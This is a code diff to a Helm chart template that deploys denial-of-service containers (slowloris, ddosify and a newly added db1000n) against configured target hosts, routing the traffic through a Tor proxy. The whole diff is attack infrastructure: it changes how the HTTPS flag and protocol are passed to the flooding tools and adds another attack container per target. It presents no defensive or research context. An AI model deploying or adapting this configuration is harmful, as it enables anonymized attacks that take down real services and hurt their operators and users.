@@ -33,7 +33,7 @@ spec:
           imagePullPolicy: {{ $.Values.slowloris.image.pullPolicy }}
           args:
             - |
-              --useproxy --proxy-host {{ $.Values.tor.host }} --proxy-port {{ $.Values.tor.socksPort }} {{ if $target.slowloris.https }}--https{{ end }} -ua --port {{ $target.port | default "443" }} {{ $target.slowloris.extraArgs | default "" }} {{ $target.host }}
+              --useproxy --proxy-host {{ $.Values.tor.host }} --proxy-port {{ $.Values.tor.socksPort }} {{ if eq ($target.protocol | default "HTTPS") "HTTPS" }}--https{{ end }} -ua --port {{ $target.port | default "443" }} {{ $target.slowloris.extraArgs | default "" }} {{ $target.host }}
           resources:
             {{- toYaml $target.slowloris.resources | nindent 12 }}
         {{- end }}
@@ -45,9 +45,16 @@ spec:
             - '/bin/sh'
             - '-c'
             - |
-              ddosify -P http://{{ $.Values.tor.host }}:{{ $.Values.tor.proxyPort }} -p {{ $target.ddosify.protocol | default "HTTPS" }} {{ $target.ddosify.extraArgs | default "" }} -t {{ $target.host }}
+              ddosify -P http://{{ $.Values.tor.host }}:{{ $.Values.tor.proxyPort }} -p {{ $target.protocol | default "HTTPS" }} {{ $target.ddosify.extraArgs | default "" }} -t {{ $target.host }}
           resources:
             {{- toYaml $target.ddosify.resources | nindent 12 }}
+        {{- end }}
+        {{- if $target.db1000n.enabled }}
+        - name: {{ $.Chart.Name }}-db1000n
+          image: "{{ $.Values.db1000n.image.repository }}:{{ $.Values.db1000n.image.tag }}"
+          imagePullPolicy: {{ $.Values.db1000n.image.pullPolicy }}
+          resources:
+            {{- toYaml $target.db1000n.resources | nindent 12 }}
         {{- end }}
       {{- with $target.nodeSelector }}
       nodeSelector:
